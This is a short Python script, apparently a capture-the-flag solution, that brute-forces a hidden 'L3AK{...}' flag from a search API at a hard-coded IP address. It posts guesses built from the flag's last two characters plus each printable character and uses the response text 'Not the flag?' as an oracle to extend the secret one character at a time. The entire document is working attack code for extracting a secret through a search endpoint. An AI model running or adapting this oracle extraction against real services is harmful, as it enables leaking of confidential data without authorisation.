import requests
import string

URL = f"http://34.134.162.213:17000/api/search"

def is_valid_flag(flag):
    r = requests.post(URL, json={"query": flag})
    return "Not the flag?" in r.text

def main():
    flag = "L3AK{"

    while "}" not in flag:
        for c in string.printable:
            trial = flag[-2:] + c

            if is_valid_flag(trial):
                flag += c

                print(f"[+] Flag: {flag}")

if __name__ == "__main__":
    main()
